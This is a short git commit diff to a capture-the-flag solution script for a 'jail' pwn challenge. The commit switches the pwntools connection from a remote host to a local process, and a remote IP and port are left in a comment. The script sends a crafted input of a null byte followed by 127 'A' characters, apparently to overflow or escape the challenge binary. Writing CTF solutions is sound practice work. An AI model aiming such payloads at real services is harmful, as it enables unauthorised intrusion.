83cbc9d40839d7df543cfc9759e872f5a7162d28
Abderrahmen <abdouolicastro@gmail.com>
2024-01-17 11:06:43 +0100

    fix

--- pwn/jail/solution/solve.py
+++ pwn/jail/solution/solve.py
@@ -1,8 +1,8 @@
 from pwn import * 
 
-# io = process("./vuln")
-# io = process("./chal")
-io = remote("0.0.0.0",1009)
+io = process("./chal")
+# io = remote("35.228.220.66",1305)
+
 
 io.sendline(b"\0"+b"A"*127)
 
